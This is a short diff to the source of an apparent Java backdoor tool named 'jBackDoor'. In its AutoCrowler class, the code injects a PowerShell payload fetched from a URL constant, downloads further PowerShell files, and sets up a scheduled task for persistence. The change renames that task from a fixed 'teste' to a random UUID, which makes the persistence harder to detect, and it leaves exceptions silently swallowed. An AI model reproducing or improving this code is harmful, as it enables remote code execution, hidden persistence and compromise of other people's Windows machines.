@@ -2,6 +2,7 @@ package jBackDoor.init;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.UUID;
 
 import jBackDoor.util.BasicPowerShellInj;
 import jBackDoor.util.BasicShedulePowerShellCreate;
@@ -17,8 +18,8 @@ public class AutoCrowler {
 			BasicPowerShellInj.injectFromUrl(URL_SHELL);
 			DownloadAndCreatepowershellFiles();
 			if (!shellpayloadScriptPatch.equals("") && PERSIST) {
-
-				BasicShedulePowerShellCreate.CreateScheduleByFile(shellpayloadScriptPatch, "teste");
+				// U can change the job name 
+				BasicShedulePowerShellCreate.CreateScheduleByFile(shellpayloadScriptPatch, UUID.randomUUID().toString());
 			}
 		} catch (IOException e) {
 		}
